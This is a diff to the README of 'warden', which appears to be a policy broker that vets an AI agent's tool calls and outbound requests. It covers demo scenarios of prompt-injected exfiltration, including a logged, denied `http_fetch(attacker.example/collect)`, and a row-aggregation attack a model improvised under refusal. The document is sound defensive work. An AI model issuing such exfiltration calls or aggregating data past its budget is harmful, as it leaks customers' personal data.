@@ -51,7 +51,9 @@ property of the deployment, not a library the agent chooses to call.**
 ## What it stops
 
 **Ten scenarios against a live `gemini-3.6-flash`.** Seven tripped a rule. The
-other three, the model refused on its own.
+other three (`triage`, `inject-internal`, `inject-cc`), the model refused on
+its own — recorded, then set aside, because [model refusal is not a
+control](#known-limitations).
 
 Each row is one transcript run **twice**: once with nothing in the way, then the
 same model output replayed through the broker. **The broker is the only thing
@@ -73,8 +75,12 @@ the *task* was carrying, which no single request contains.
 
 The customer table holds **10,312 rows**, so unbrokered, `report` read all of it
 twice over. The budget is **50 rows per task**. Every figure above was written by
-the run itself, and `warden-demo explain --matrix` reproduces the shape of it
-offline.
+the run itself, and the run is in the repo: [docs/evidence/](docs/evidence/)
+holds the frozen log and its manifest — model, commit, policy digest, output
+hash. `warden-demo explain --matrix` replays six of the seven rows offline from
+recorded transcripts, each with its own recorded byte counts; `report` has no
+recording, because the aggregation attack is the model improvising under
+refusal, which a recording cannot do.
 
 **Six of the seven still delivered their email.** Refusal and a finished task
 coexist. `readonly` is the deliberate exception: that agent was scoped to look
@@ -106,7 +112,7 @@ Python only. No Docker needed for the policy, audit, replay and scenario paths:
 ```bash
 git clone https://github.com/slavikztsv/warden.git
 cd warden
-python3.11 -m venv .venv
+python3 -m venv .venv                         # any Python 3.11+
 .venv/bin/pip install -e ./warden -e ./demo -e ./tools
 .venv/bin/warden-demo
 ```
@@ -130,7 +136,7 @@ task 4711  purpose=support-triage  agent=triage-bot
   ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
   ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
   ✓ send_email(customer:8812)              allow
-  chain intact: 7 records, head sha256:…
+  chain intact: 7 records, head sha256:6a7a9bb9…
 ```
 
 That last line is a real chain verification. **A tampered log renders
@@ -143,7 +149,7 @@ Everything the demo can do: **[docs/DEMO.md](docs/DEMO.md)**.
 ## How it works
 
 <p align="center">
-  <img src="docs/assets/architecture.png" alt="broker-control, on its own network, signs an Ed25519 token and hands it to the untrusted agent runtime, which proposes but never decides. The agent reaches warden, one process and one worker, through two surfaces: the tool API on 8080 for declared tools, and the egress proxy on 3128 for all other HTTP. Both feed the same spine: verify signature and expiry, snapshot rows read and data held, validate (tool calls only), decide by asking OPA, which evaluates authz.rego (the rules) against data.json (your hostnames, tools and row limit), then record before anything runs. Only then do the adapters execute against the protected systems." width="100%">
+  <img src="docs/assets/architecture.png" alt="broker-control, on its own network, signs an Ed25519 token and hands it to the untrusted agent runtime, which proposes but never decides. The agent reaches warden, one process and one worker, through two surfaces: the tool API on 8080 for declared tools, and the egress proxy on 3128 for all other HTTP. Both feed the same spine: verify signature and expiry, snapshot rows read and data held, validate (tool calls only), decide by asking OPA, which evaluates authz.rego (the rules) against data.json (your tools, purposes and limits), then record before anything runs. Only then do the adapters execute against the protected systems." width="100%">
 </p>
 
 **The order is the security property:**
@@ -204,7 +210,7 @@ audit log is therefore the rule that actually fired.
 | File | What is in it | Whose |
 |---|---|---|
 | [`warden/policies/authz.rego`](warden/policies/authz.rego) | The seven rules above, written so they never name a host, a tool or a number | Ships with `warden`. 387 lines, most of them the reasoning |
-| [`demo/scenario/data.json`](demo/scenario/data.json) | The lists the rules check against: your hostnames, your tools, your row limit | **Yours.** 22 lines |
+| [`demo/scenario/data.json`](demo/scenario/data.json) | The lists the rules check against, under three keys: `tools`, `purposes` (which hosts each kind of task may reach), `limits` (the row budget) | **Yours.** 22 lines |
 
 That second file is the whole configuration. In this demo it says: `send_email`
 sends mail, a `support-triage` task may reach two hosts, only one of those may
@@ -274,7 +280,7 @@ calls it on a timer, so treat it as designed-for rather than demonstrated.
 change.** You point it at two endpoints.
 
 <p align="center">
-  <img src="docs/assets/integration.png" alt="Your agent talks to warden's tool API and egress proxy; warden decides, then reaches your systems" width="100%">
+  <img src="docs/assets/integration.png" alt="Your agent, code unchanged: its agent loop reaches the tool API on 8080 via BROKER_URL, and its model SDK, HTTP client or curl reaches the egress proxy on 3128 via HTTP_PROXY. Both surfaces feed one policy, taint and audit gate inside warden, and the allowed paths reach your databases, APIs and mail, and allowlisted hosts. A deny returns 403 naming the rule in X-Warden-Rule, and the decision is recorded either way." width="100%">
 </p>
 
 ```bash
@@ -305,10 +311,10 @@ brokered tools without changing, is the obvious next step and is
 ### Using it with your own tools
 
 <p align="center">
-  <img src="docs/assets/deployment.png" width="100%" alt="Three columns. Comes with warden, from pip install: the warden command with serve, control, replay, verify-chain and config; four adapters plus authz.rego, being docstore, sql, http and mail and the seven rules; and no config at all, with no tool, host or limit anywhere. You write these, four files and one key: one Ed25519 keypair made with openssl once; warden.toml and control.toml saying where things listen and live; tools.toml and data.json holding one block per tool and your hosts and limits. You run these, three processes: OPA to evaluate the rules, warden serve and warden control, and your own agent unchanged with BROKER_URL and HTTP_PROXY set. Underneath: per tool you write three things, kind for which adapter, binding for how to reach your system, args for what the agent may pass. And a warning: a backend that is not a document store, SQL database, HTTP API or mailer needs Python inside warden, which is a stated limitation.">
+  <img src="docs/assets/deployment.png" width="100%" alt="Three columns. Comes with warden, from pip install: the warden command with serve, control, replay, verify-chain and config; four adapters plus authz.rego, being docstore, sql, http and mail and the seven rules; and no config at all, with no tool, host or limit anywhere. You write these, four files and one key: one Ed25519 keypair made with openssl once; warden.toml and control.toml saying where things listen and live; tools.toml and data.json holding one block per tool and your hosts and limits. You run these, four processes: OPA to evaluate the rules, warden serve and warden control, and your own agent unchanged with BROKER_URL and HTTP_PROXY set. Underneath: per tool you write three things, kind for which adapter, binding for how to reach your system, args for what the agent may pass. And a warning: a backend that is not a document store, SQL database, HTTP API or mailer needs Python inside warden, which is a stated limitation.">
 </p>
 
-**You never write Python.** For each tool, three lines of TOML:
+**You never write Python.** For each tool, three stanzas of TOML:
 
 ```toml
 [tools.query_customers]
@@ -339,7 +345,7 @@ tool. All ten of those arrive in the binding.
 **`sql` is a transport. `query_customers` is a tool.** The relationship a
 database driver has to your data model.
 
-And what warden does with your three lines, on every call:
+And what warden does with your three stanzas, on every call:
 
 <p align="center">
   <img src="docs/assets/adapters.png" width="100%" alt="Five steps. You name the tool and pick an adapter with kind = sql, one of the four warden ships. You give the binding that reaches your own system: db, table, columns, subject_column, data_class, with dollar-brace variables read from the environment at load time so no credential sits in the file. You declare the arguments the agent may pass, and warden shape-checks every call against that schema before any of your code sees it. Then warden's adapter calls describe(args), working out that the call targets kind=db, subject customer:8812, one row, running a COUNT first so the agent cannot understate how much it is asking for. Finally warden calls execute(args) to run the SELECT against your database, only if policy allowed, from the same arguments that were judged.">
@@ -375,7 +381,7 @@ are the product and do not change.
 ## Repository
 
 <p align="center">
-  <img src="docs/assets/repo-map.png" width="100%" alt="warden/ is the product: broker, adapters, config, policies, CLI, reference. demo/ is one deployment: scenario TOML, policy data, agent, mocks. tests/ and tools/ are the proof. demo depends on warden; warden cannot import demo, enforced by tests/test_seam.py">
+  <img src="docs/assets/repo-map.png" width="100%" alt="warden/ is the product: broker, adapters, config, policies, CLI, reference. demo/ is one deployment: scenario TOML, policy data, agent, mocks, and the demo CLI. tests/ and tools/ are the proof. demo depends on warden; warden cannot import demo, enforced by tests/test_seam.py">
 </p>
 
 **`warden/` is the product and ships no scenario.** No tool catalog, no
@@ -384,8 +390,11 @@ your own tools is a config change, not a fork.
 
 **Nothing relies on discipline to keep it that way.**
 [tests/test_seam.py](tests/test_seam.py) breaks the build if a `warden/` module
-imports `demo`, if the product ever ships a `tools.toml`, or if any file under
-`warden/` so much as *mentions* one of the demo's names.
+imports `demo`, if the product ever ships a `tools.toml`, or if any source or
+config file under `warden/` — every `.py`, `.rego`, `.toml` and `.json` — so
+much as *mentions* one of the demo's names. The one exception is pinned by
+name in the test itself: OPA forces its test fixture to live beside the
+policy, and the compose files never mount it.
 
 ---
 
@@ -397,7 +406,10 @@ so the working assumption in 2026 is that some will land and the job is to bound
 what a landed one can do. Several families of tool exist, and they mostly
 **compose rather than compete**.
 
-✅ does it · ❌ does not · ⚪ their docs do not say
+✅ does it · ❌ does not · ⚠️ does it, but probabilistically · ⚪ their docs do
+not say. **"Blocks the call first"** means the agent's tool call or network
+request can be *denied before it executes* — not a prompt scanned on the way
+in, not a log written after.
 
 | Product | Blocks the call first | Limits add up across calls | Judges what the task already holds | Egress control | Production | Licence |
 |---|:---:|:---:|:---:|:---:|:---:|---|
@@ -411,9 +423,9 @@ what a landed one can do. Several families of tool exist, and they mostly
 | 🛡️ **`warden`** | ✅ | ✅ | ✅ | ✅ | ❌ | Apache 2.0 |
 
 **Where each sits.** Lakera at the prompt, Portkey and LiteLLM at the model,
-Invariant at the LLM and MCP proxy, Delinea inside the session, E2B at the
-network. `warden` is on the tool API **and** the egress path, which is why one
-task state can cover both.
+Invariant at the LLM and MCP proxy, MS Agent Governance inside the agent
+runtime, Delinea inside the session, E2B at the network. `warden` is on the
+tool API **and** the egress path, which is why one task state can cover both.
 
 **Use something else if you need** dataflow rules on MCP today
 ([Invariant](https://github.com/invariantlabs-ai/invariant)), process isolation
@@ -431,8 +443,9 @@ refusals on volume, then 37 on scope.**
 does not survive a restart, no managed service, no UI. See
 [limitations](#known-limitations).
 
-⚪ means their docs did not say, not that they cannot. Read from public material,
-and any of it can move in a month.
+⚪ means their docs did not say, not that they cannot; where a ⚪ carries a
+note, the note is the nearest fact their docs do state. Read from public
+material, and any of it can move in a month.
 
 ---
 
@@ -492,7 +505,7 @@ are mine.**
 **The findings are the part worth reading.** Each came from attacking and
 reviewing the system, not from writing it:
 
-- **Six rules that failed open.** In Rego, if one piece of a rule is undefined
+- **Six fail-open paths in the rules.** In Rego, if one piece of a rule is undefined
   the whole rule is undefined, and an undefined rule simply never fires. It does
   not error. Two of the six were invisible to `opa test` because every test case
   supplied its own fake data instead of the real policy data.
